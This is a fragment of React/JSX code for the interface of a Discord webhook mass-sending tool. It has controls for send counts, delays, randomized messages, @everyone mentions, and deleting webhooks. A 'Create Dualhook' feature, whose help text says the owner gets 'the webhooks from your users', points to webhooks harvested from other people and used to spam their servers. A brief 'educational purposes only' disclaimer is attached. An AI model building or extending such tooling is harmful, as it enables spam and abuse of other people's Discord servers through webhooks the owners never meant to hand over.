          {/* Enhanced import button with better state transitions */}
          <div className="flex flex-wrap gap-1 sm:gap-1.5 mb-2 sm:mb-3">
            <button
              onClick={addWebhook}
              className="generator-button bg-gradient-to-r from-purple-700 to-purple-600 hover:from-purple-800 hover:to-purple-700 text-white px-2 py-1 sm:py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors shadow-md"
              disabled={isSending || importButtonState === "loading"}
            >
              <Plus className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              Add Webhook
            </button>
            <button
              onClick={clearAllWebhooks}
              className="backup-button bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors shadow-md"
              disabled={isSending || importButtonState === "loading"}
            >
              <Trash2 className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              Clear All
            </button>
            <label
              className={`hyperlink-button relative overflow-hidden ${
                importButtonState === "loading"
                  ? "bg-gradient-to-r from-purple-700 to-purple-600 animate-pulse"
                  : importButtonState === "success"
                    ? "bg-gradient-to-r from-green-700 to-green-600"
                    : importButtonState === "error"
                      ? "bg-gradient-to-r from-red-700 to-red-600"
                      : "bg-gradient-to-r from-gray-700 to-gray-800 hover:from-gray-800 hover:to-gray-900"
              } text-white px-2 py-1 sm:py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors cursor-pointer shadow-md`}
            >
              {importButtonState === "loading" ? (
                <Loader2 className="w-3 h-3 sm:w-3.5 sm:h-3.5 animate-spin" />
              ) : importButtonState === "success" ? (
                <CheckCircle className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              ) : importButtonState === "error" ? (
                <AlertCircle className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              ) : (
                <Upload className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              )}
              {importButtonText}
              <input
                type="file"
                accept=".txt"
                className="hidden"
                onChange={handleFileUpload}
                ref={fileInputRef}
                disabled={isSending || importButtonState === "loading"}
              />
              {importButtonState === "loading" && (
                <div
                  className="absolute bottom-0 left-0 h-1 bg-white/30 rounded-full"
                  style={{ width: `${importProgress}%` }}
                ></div>
              )}
            </label>

            {/* Dualhook button */}
            <button
              onClick={() => setShowDualhookModal(true)}
              className="bg-gradient-to-r from-indigo-700 to-indigo-600 hover:from-indigo-800 hover:to-indigo-700 text-white px-2 py-1 sm:py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors shadow-md"
              disabled={isSending || importButtonState === "loading"}
            >
              <Share2 className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
              Create Dualhook
            </button>
          </div>

          <div className="w-full border border-dashed border-gray-700 rounded-lg p-1.5 sm:p-2 text-center mb-2 sm:mb-3 bg-black/20 backdrop-blur-sm hover:border-purple-500/40 transition-colors">
            <Upload className="w-3.5 h-3.5 sm:w-4 sm:h-4 mx-auto mb-0.5 sm:mb-1 text-purple-400" />
            <p className="text-xs text-gray-300">Drop webhook list (.txt) here</p>
          </div>

          <div className="space-y-1 sm:space-y-1.5 mb-2 sm:mb-3 max-h-[20vh] overflow-y-auto p-0.5 sm:p-1 custom-scrollbar">
            {webhooks.length === 0 ? (
              <div className="text-center py-1.5 sm:py-2 text-gray-400 border border-gray-800 rounded-lg bg-black/20">
                <p className="text-xs">No webhooks added yet.</p>
              </div>
            ) : (
              webhooks.map((webhook) => (
                <div
                  key={webhook.id}
                  className={`border ${getStatusColor(
                    webhook.status,
                  )} rounded-lg p-1.5 sm:p-2 bg-black/40 flex items-center gap-1 transition-colors backdrop-blur-sm hover:bg-black/60`}
                >
                  <input
                    type="text"
                    value={webhook.url}
                    onChange={(e) => updateWebhookUrl(webhook.id, e.target.value)}
                    placeholder="https://discord.com/api/webhooks/..."
                    className="flex-1 bg-transparent border-none focus:outline-none text-xs"
                    disabled={isSending || webhook.status === "deleted"}
                  />
                  <div className="flex items-center gap-1">
                    {getStatusIcon(webhook.status)}
                    {webhook.status !== "idle" && (
                      <span
                        className={`text-xs ${
                          webhook.status === "success"
                            ? "text-green-400"
                            : webhook.status === "error"
                              ? "text-red-400"
                              : webhook.status === "deleted"
                                ? "text-red-300"
                                : "text-yellow-400"
                        }`}
                      >
                        {webhook.message}
                      </span>
                    )}
                    <div className="flex items-center">
                      <button
                        onClick={() => handleTestWebhook(webhook.id)}
                        className="text-gray-400 hover:text-blue-400 transition-colors p-0.5 sm:p-1 rounded-full hover:bg-blue-900/20"
                        disabled={isSending || isTesting || webhook.status === "deleted"}
                        title="Test webhook"
                      >
                        <TestTube className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                      </button>
                      <button
                        onClick={() => handleDeleteWebhook(webhook.id)}
                        className="text-gray-400 hover:text-red-400 transition-colors p-0.5 sm:p-1 rounded-full hover:bg-red-900/20"
                        disabled={isSending || isDeleting || webhook.status === "deleted"}
                        title="Delete webhook"
                      >
                        <Trash className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                      </button>
                      <button
                        onClick={() => removeWebhook(webhook.id)}
                        className="text-gray-400 hover:text-red-400 transition-colors p-0.5 sm:p-1 rounded-full hover:bg-red-900/20"
                        disabled={isSending}
                        title="Remove from list"
                      >
                        <X className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                      </button>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>

          <div className="space-y-1.5 sm:space-y-2 mb-2 sm:mb-3">
            <div>
              <div className="flex justify-between items-center mb-0.5 sm:mb-1">
                <label className="block text-xs font-medium text-gray-200">Message Content</label>
                <button
                  onClick={() => setShowMessageVariants(!showMessageVariants)}
                  className="text-xs text-purple-400 hover:text-purple-300 transition-colors flex items-center gap-0.5 sm:gap-1 px-1 sm:px-1.5 py-0.5 rounded hover:bg-purple-950/20"
                >
                  {showMessageVariants ? (
                    <ChevronUp className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                  ) : (
                    <ChevronDown className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                  )}
                  {showMessageVariants ? "Hide Variants" : "Show Variants"}
                  {randomizeMessages && <span className="text-purple-400 ml-0.5 sm:ml-1">• Random</span>}
                </button>
              </div>
              <textarea
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Enter your message here..."
                className="w-full bg-black/40 border border-gray-800 rounded-lg p-1.5 sm:p-2 focus:outline-none focus:border-purple-500 transition-colors min-h-[50px] sm:min-h-[60px] backdrop-blur-sm text-xs"
                disabled={isSending}
              />
            </div>

            <AnimatePresence>
              {showMessageVariants && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: "auto" }}
                  exit={{ opacity: 0, height: 0 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-3 border-t border-gray-800 pt-2"
                >
                  <div className="flex items-center gap-2 p-2 bg-gray-900/30 rounded-lg">
                    <input
                      type="checkbox"
                      id="randomize"
                      checked={randomizeMessages}
                      onChange={(e) => setRandomizeMessages(e.target.checked)}
                      className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                      disabled={isSending}
                    />
                    <label htmlFor="randomize" className="text-xs font-medium text-gray-300">
                      Randomize Messages
                    </label>
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      value={currentVariant}
                      onChange={(e) => setCurrentVariant(e.target.value)}
                      placeholder="Add variant..."
                      className="flex-1 bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-xs backdrop-blur-sm"
                      disabled={isSending}
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && currentVariant.trim()) {
                          addMessageVariant()
                        }
                      }}
                    />
                    <button
                      onClick={addMessageVariant}
                      className="bg-purple-700 hover:bg-purple-800 text-white px-2 py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors"
                      disabled={isSending || !currentVariant.trim()}
                    >
                      <Plus className="w-3.5 h-3.5" />
                      Add
                    </button>
                  </div>

                  <div className="max-h-[140px] overflow-y-auto space-y-1.5 p-1 custom-scrollbar">
                    {messageVariants.length === 0 ? (
                      <div className="text-center py-2 text-gray-400 text-xs border border-gray-800 rounded-lg bg-black/20">
                        <p>No variants added yet.</p>
                      </div>
                    ) : (
                      messageVariants.map((variant, index) => (
                        <div
                          key={index}
                          className="flex items-center justify-between bg-black/40 border border-gray-800 rounded-lg p-2 backdrop-blur-sm hover:bg-black/60"
                        >
                          <p className="text-xs truncate flex-1">{variant}</p>
                          <button
                            onClick={() => removeMessageVariant(index)}
                            className="text-gray-400 hover:text-red-400 transition-colors p-1 rounded-full hover:bg-red-900/20"
                            disabled={isSending}
                          >
                            <X className="w-3 h-3" />
                          </button>
                        </div>
                      ))
                    )}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              <div>
                <label className="block text-xs font-medium text-gray-200 mb-1">Username</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Custom webhook username"
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                  disabled={isSending}
                />
              </div>
              <div>
                <label className="block text-xs font-medium text-gray-200 mb-1">Avatar URL</label>
                <input
                  type="text"
                  value={avatarUrl}
                  onChange={(e) => setAvatarUrl(e.target.value)}
                  placeholder="https://example.com/avatar.png"
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                  disabled={isSending}
                />
              </div>
            </div>

            <div className="flex flex-wrap gap-1.5 items-center">
              <button
                onClick={() => setShowAdvanced(!showAdvanced)}
                className="bg-gray-900 hover:bg-gray-800 text-white px-2 py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors"
                disabled={isSending}
              >
                <Settings className="w-3.5 h-3.5" />
                {showAdvanced ? "Hide Advanced" : "Advanced"}
              </button>
              <button
                onClick={() => setShowEmbed(!showEmbed)}
                className="bg-gray-900 hover:bg-gray-800 text-white px-2 py-1.5 rounded-md text-xs font-medium flex items-center gap-1 transition-colors"
                disabled={isSending}
              >
                <Info className="w-3.5 h-3.5" />
                {showEmbed ? "Hide Embed" : "Embed"}
              </button>
              <div className="flex items-center gap-1.5 px-2 py-1.5 bg-gray-900/30 rounded-md">
                <input
                  type="checkbox"
                  id="tts"
                  checked={ttsEnabled}
                  onChange={(e) => setTtsEnabled(e.target.checked)}
                  className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                  disabled={isSending}
                />
                <label htmlFor="tts" className="text-xs font-medium text-gray-300">
                  TTS
                </label>
              </div>
            </div>

            <AnimatePresence>
              {showAdvanced && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: "auto" }}
                  exit={{ opacity: 0, height: 0 }}
                  transition={{ duration: 0.3 }}
                  className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-2 border-t border-gray-800"
                >
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Send Count</label>
                    <div className="flex items-center">
                      <input
                        type="number"
                        value={sendCount}
                        onChange={(e) => setSendCount(Math.max(1, Number.parseInt(e.target.value) || 1))}
                        min="1"
                        max="100"
                        className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                        disabled={isSending}
                      />
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Delay (ms)</label>
                    <div className="flex items-center">
                      <input
                        type="number"
                        value={delay}
                        onChange={(e) => setDelay(Math.max(0, Number.parseInt(e.target.value) || 0))}
                        min="0"
                        max="10000"
                        step="100"
                        className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                        disabled={isSending}
                      />
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Mention Options</label>
                    <div className="flex items-center gap-2 p-2 bg-gray-900/30 rounded-lg">
                      <div className="flex items-center gap-1.5">
                        <input
                          type="checkbox"
                          id="mentionEveryone"
                          checked={mentionEveryone}
                          onChange={(e) => {
                            setMentionEveryone(e.target.checked)
                            if (e.target.checked) setMentionHere(false)
                          }}
                          className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                          disabled={isSending}
                        />
                        <label htmlFor="mentionEveryone" className="text-xs text-gray-300">
                          @everyone
                        </label>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <input
                          type="checkbox"
                          id="mentionHere"
                          checked={mentionHere}
                          onChange={(e) => {
                            setMentionHere(e.target.checked)
                            if (e.target.checked) setMentionEveryone(false)
                          }}
                          className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                          disabled={isSending}
                        />
                        <label htmlFor="mentionHere" className="text-xs text-gray-300">
                          @here
                        </label>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center">
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(webhooks.map((w) => w.url).join("\n"))
                        setGlobalStatus("Copied all webhook URLs to clipboard")
                      }}
                      className="bg-gray-900 hover:bg-gray-800 text-white px-2 py-2 rounded-md text-xs font-medium flex items-center gap-1 transition-colors w-full"
                      disabled={isSending || webhooks.length === 0}
                    >
                      <Copy className="w-3.5 h-3.5" />
                      Copy All
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            <AnimatePresence>
              {showEmbed && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: "auto" }}
                  exit={{ opacity: 0, height: 0 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-2 pt-2 border-t border-gray-800"
                >
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Embed Title</label>
                    <input
                      type="text"
                      value={embedTitle}
                      onChange={(e) => setEmbedTitle(e.target.value)}
                      placeholder="Embed title"
                      className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                      disabled={isSending}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Embed Description</label>
                    <textarea
                      value={embedDescription}
                      onChange={(e) => setEmbedDescription(e.target.value)}
                      placeholder="Embed description"
                      className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors min-h-[50px] backdrop-blur-sm text-xs"
                      disabled={isSending}
                    />
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <div>
                      <label className="block text-xs font-medium text-gray-200 mb-1">Embed Color</label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={embedColor}
                          onChange={(e) => setEmbedColor(e.target.value)}
                          className="bg-black/40 border border-gray-800 rounded p-0.5 h-[30px] w-[30px]"
                          disabled={isSending}
                        />
                        <input
                          type="text"
                          value={embedColor}
                          onChange={(e) => setEmbedColor(e.target.value)}
                          placeholder="#000000"
                          className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                          disabled={isSending}
                        />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-gray-200 mb-1">Embed Footer</label>
                      <input
                        type="text"
                        value={embedFooter}
                        onChange={(e) => setEmbedFooter(e.target.value)}
                        placeholder="Footer text"
                        className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                        disabled={isSending}
                      />
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-200 mb-1">Embed Image URL</label>
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        value={embedImage}
                        onChange={(e) => setEmbedImage(e.target.value)}
                        placeholder="https://example.com/image.png"
                        className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors backdrop-blur-sm text-xs"
                        disabled={isSending}
                      />
                      <button
                        className="bg-gray-900 hover:bg-gray-800 text-white p-2 rounded-md text-xs font-medium transition-colors"
                        disabled={isSending || !embedImage}
                        title="Preview image"
                        onClick={() => {
                          if (embedImage) window.open(embedImage, "_blank")
                        }}
                      >
                        <ImageIcon className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {globalStatus && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              className={`mb-2 p-2 rounded-lg border ${
                globalStatus.includes("error") || globalStatus.includes("failed")
                  ? "border-red-500/30 bg-red-900/10 text-red-200"
                  : globalStatus.includes("success") || globalStatus.includes("Completed")
                    ? "border-green-500/30 bg-green-900/10 text-green-200"
                    : "border-blue-500/30 bg-blue-900/10 text-blue-200"
              }`}
            >
              <p className="text-xs flex items-center gap-1.5">
                {globalStatus.includes("error") || globalStatus.includes("failed") ? (
                  <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
                ) : globalStatus.includes("success") || globalStatus.includes("Completed") ? (
                  <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" />
                ) : (
                  <Info className="w-3.5 h-3.5 flex-shrink-0" />
                )}
                {globalStatus}
              </p>
            </motion.div>
          )}

          {massSpamming && (
            <div className="mb-2">
              <div className="flex justify-between items-center mb-1">
                <span className="text-xs text-gray-300">Progress: {spamProgress}%</span>
              </div>
              <div className="w-full bg-gray-900 rounded-full h-1.5 overflow-hidden">
                <div
                  className="bg-gradient-to-r from-purple-700 to-purple-500 h-1.5 rounded-full transition-all duration-300"
                  style={{ width: `${spamProgress}%` }}
                ></div>
              </div>
            </div>
          )}

          <div className="flex justify-center gap-3">
            <button
              onClick={handleSpam}
              disabled={webhooks.length === 0 || (!message && messageVariants.length === 0) || isSending}
              className={`${
                isSending
                  ? "bg-gray-700 cursor-not-allowed"
                  : "bg-gradient-to-r from-purple-700 to-purple-600 hover:from-purple-800 hover:to-purple-700"
              } text-white px-3 sm:px-4 py-1.5 sm:py-2 rounded-md text-xs sm:text-sm font-medium flex items-center gap-1 sm:gap-1.5 transition-all duration-300 relative overflow-hidden shadow-lg shadow-purple-900/20`}
              style={{ minWidth: "120px", minHeight: "36px" }}
            >
              {isSending ? (
                <>
                  <Loader2 className="w-3.5 h-3.5 sm:w-4 sm:h-4 animate-spin" />
                  Sending...
                </>
              ) : (
                <>
                  <Send className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  Send Messages
                </>
              )}
              {!isSending && (
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent opacity-0 group-hover:opacity-100 shine-animation"></div>
              )}
            </button>

            <button
              onClick={copyAllMessages}
              disabled={(!message && messageVariants.length === 0) || isSending}
              className="bg-gradient-to-r from-blue-700 to-blue-600 hover:from-blue-800 hover:to-blue-700 text-white px-3 sm:px-4 py-1.5 sm:py-2 rounded-md text-xs sm:text-sm font-medium flex items-center gap-1 sm:gap-1.5 transition-all duration-300 relative overflow-hidden shadow-lg shadow-blue-900/20"
              style={{ minWidth: "120px", minHeight: "36px" }}
            >
              <Copy className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              Copy Message
            </button>
          </div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          className="border border-purple-500/20 rounded-xl w-full bg-black/30 backdrop-blur-sm shadow-xl shadow-purple-900/10 overflow-hidden purple-glow-container"
        >
          <div
            className="flex items-center justify-between p-1.5 sm:p-2 cursor-pointer bg-gradient-to-r from-gray-900 to-black hover:from-purple-950/30 hover:to-black transition-colors"
            onClick={() => setShowHelp(!showHelp)}
          >
            <div className="flex items-center gap-1 sm:gap-1.5">
              <HelpCircle className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-purple-400 flex-shrink-0" />
              <h3 className="font-medium text-white text-xs">What is this tool for?</h3>
            </div>
            <div>
              {showHelp ? (
                <ChevronUp className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-gray-400" />
              ) : (
                <ChevronDown className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-gray-400" />
              )}
            </div>
          </div>

          <AnimatePresence>
            {showHelp && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.3 }}
                className="p-2 border-t border-gray-800"
              >
                <p className="text-xs text-gray-300 leading-relaxed">
                  When you own a dualhook, you get the webhooks from your users. With webhooks, you can send messages in
                  the users' Discord servers to get them to join your Discord server or send important notifications.
                </p>
                <div className="mt-2 flex items-center gap-1.5 p-2 bg-purple-950/20 rounded-lg border border-purple-500/20">
                  <Shield className="w-3.5 h-3.5 text-purple-400" />
                  <p className="text-xs text-gray-300">
                    This tool is for educational purposes only. Misuse of webhooks may violate Discord's Terms of
                    Service.
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      </motion.div>

      <style jsx global>{`
        @keyframes shine {
          0% {
            transform: translateX(-100%) rotate(15deg);
          }
          20% {
            transform: translateX(100%) rotate(15deg);
          }
          100% {
            transform: translateX(100%) rotate(15deg);
          }
        }

        .shine-animation {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: linear-gradient(
            to right,
            transparent 0%,
            rgba(255, 255, 255, 0.1) 50%,
            transparent 100%
          );
          transform: translateX(-100%) rotate(15deg);
          transition: none;
        }

        .purple-glow {
          text-shadow: 0 0 10px rgba(139, 92, 246, 0.7), 0 0 20px rgba(139, 92, 246, 0.5), 0 0 30px rgba(139, 92, 246, 0.3);
        }

        .purple-glow-container {
          box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
          animation: purple-container-pulse 4s infinite alternate;
        }

        @keyframes purple-container-pulse {
          0% {
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
          }
          100% {
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.5);
          }
        }
        
        .custom-scrollbar::-webkit-scrollbar {
          width: 4px;
          height: 4px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(0, 0, 0, 0.2);
          border-radius: 10px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(139, 92, 246, 0.5);
          border-radius: 10px;
        }
        
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(139, 92, 246, 0.7);
        }

        /* Button styles to match the main site */
        .generator-button, .hyperlink-button, .backup-button {
          position: relative;
          overflow: hidden;
          transition: all 0.3s ease;
          box-shadow: 0 0 15px rgba(139, 92, 246, 0.2);
        }

        .generator-button:hover, .hyperlink-button:hover, .backup-button:hover {
          transform: translateY(-2px);
          box-shadow: 0 0 20px rgba(139, 92, 246, 0.4);
        }

        .generator-button::before, .hyperlink-button::before, .backup-button::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.3) 0%, transparent 70%);
          opacity: 0;
          transition: opacity 0.3s ease;
          z-index: -1;
        }

        .generator-button:hover::before, .hyperlink-button:hover::before, .backup-button:hover::before {
          opacity: 1;
        }

        /* Improve focus styles for better accessibility */
        *:focus-visible {
          outline: 2px solid rgba(139, 92, 246, 0.6);
          outline-offset: 2px;
        }
        
        /* Smooth transitions for all interactive elements */
        button, a, input, textarea, select {
          transition: all 0.2s ease;
        }
        
        /* Enhance button hover effects */
        button:not(:disabled):hover, 
        a:not(:disabled):hover {
          transform: translateY(-1px);
        }
        
        button:not(:disabled):active, 
        a:not(:disabled):active {
          transform: translateY(0);
        }

        /* Animated gradient background */
        @keyframes gradientAnimation {
          0% {
            background-position: 0% 50%;
          }
          50% {
            background-position: 100% 50%;
          }
          100% {
            background-position: 0% 50%;
          }
        }

        /* Mobile optimizations */
        @media (max-width: 640px) {
          .purple-glow-container {
            box-shadow: 0 0 10px rgba(139, 92, 246, 0.2);
          }
          
          input, textarea, select, button {
            font-size: 0.75rem !important;
          }
          
          .custom-scrollbar::-webkit-scrollbar {
            width: 3px;
            height: 3px;
          }
          
          /* Improve touch targets */
          button, 
          input[type="checkbox"], 
          input[type="radio"],
          label {
            min-height: 32px;
            min-width: 32px;
          }
          
          /* Fix button spacing */
          .generator-button, .hyperlink-button, .backup-button {
            padding: 0.375rem 0.5rem;
          }
          
          /* Optimize modal for mobile */
          .fixed.inset-0.flex.items-center.justify-center > div {
            width: 90% !important;
            max-width: 90% !important;
            margin: 0 auto;
          }
        }
      `}</style>
    </div>
  )
}
